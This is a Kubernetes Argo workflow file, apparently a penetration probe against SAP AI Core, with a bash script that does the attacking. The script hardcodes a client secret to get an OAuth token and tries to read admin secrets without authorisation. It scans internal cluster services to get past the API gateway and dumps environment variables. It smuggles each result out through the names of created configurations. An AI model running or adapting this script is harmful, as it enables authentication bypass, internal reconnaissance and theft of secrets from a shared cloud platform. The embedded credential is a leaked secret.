apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "53.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      env:
      - name: AICORE_EXECUTION_ID
        value: "fake-exec-id"
      - name: AICORE_TRACKING_ENDPOINT
        value: "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2"
      - name: SKIP_AUTHORIZATION
        value: "true"
      command:
      - bash
      - -c
      - |
        # V53: Test auth bypass via env vars + internal tracking API
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v53-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        # 1. Test public API WITHOUT auth header (from inside cluster)
        echo "=== NO-AUTH API ===" >&2
        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "noauth-secrets-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "${API}/v2/lm/executions" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "noauth-execs-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/repositories" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "noauth-repos-$(echo $R | head -c 150)"

        # 2. Test with empty Authorization header
        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/secrets" -H "Authorization: " -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "emptyauth-secrets-$(echo $R | head -c 150)"

        # 3. Test internal tracking API endpoints
        echo "=== TRACKING API ===" >&2
        # Try the known internal hostname from SDK
        TRACKING="api.ai.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
        R=$(curl -sk --connect-timeout 5 "https://${TRACKING}/api/v1" 2>&1 | head -c 200)
        save "tracking-v1-$(echo $R | head -c 150)"

        R=$(curl -sk --connect-timeout 5 "https://${TRACKING}/v2/lm/executions" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
        save "tracking-execs-$(echo $R | head -c 150)"

        # 4. Try ml-tracking namespace services
        for svc in ml-tracking tracking-server mlflow; do
          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
          if [ -n "$ip" ]; then
            save "ml-track-dns-${svc}-${ip}"
            R=$(curl -sk --connect-timeout 3 "http://${ip}:80/" 2>&1 | head -c 150)
            save "ml-track-${svc}-80-$(echo $R | head -c 100)"
            R=$(curl -sk --connect-timeout 3 "http://${ip}:5000/" 2>&1 | head -c 150)
            save "ml-track-${svc}-5000-$(echo $R | head -c 100)"
          fi
        done

        # 5. Try the API via internal K8s service DNS (bypass external gateway)
        echo "=== INTERNAL API ===" >&2
        # The API might have an internal service name
        for svc in ai-core-api api-server ml-api-facade resource-group-manager; do
          for ns in aicore ml-api-facade; do
            ip=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
            if [ -n "$ip" ]; then
              save "intapi-${svc}-${ns}-${ip}"
              # Try accessing admin endpoints without auth via internal service
              R=$(curl -sk --connect-timeout 3 "http://${ip}:80/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
              save "intapi-${svc}-secrets-$(echo $R | head -c 150)"
              R=$(curl -sk --connect-timeout 3 "http://${ip}:8080/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
              save "intapi-${svc}-8080-$(echo $R | head -c 150)"
            fi
          done
        done

        # 6. Try resource-group-manager directly (found in V51 KSM data)
        echo "=== RG MANAGER ===" >&2
        RGM_IP=$(dig +short "resource-group-manager.aicore.svc.cluster.local" 2>/dev/null | head -1)
        save "rgm-ip-${RGM_IP:-NXDOMAIN}"
        if [ -n "$RGM_IP" ]; then
          for port in 80 8080 8443; do
            R=$(curl -sk --connect-timeout 3 "http://${RGM_IP}:${port}/" 2>&1 | head -c 200)
            save "rgm-${port}-$(echo $R | head -c 150)"
          done
        fi

        # 7. Check what env vars the container actually has (AICORE_* injected by platform?)
        echo "=== ENV ===" >&2
        AICORE_VARS=$(env | grep -i "AICORE\|AI_CORE\|SAP\|SKIP_AUTH" | tr '\n' '|')
        save "env-aicore-${AICORE_VARS}"

        echo "V53 DONE" >&2
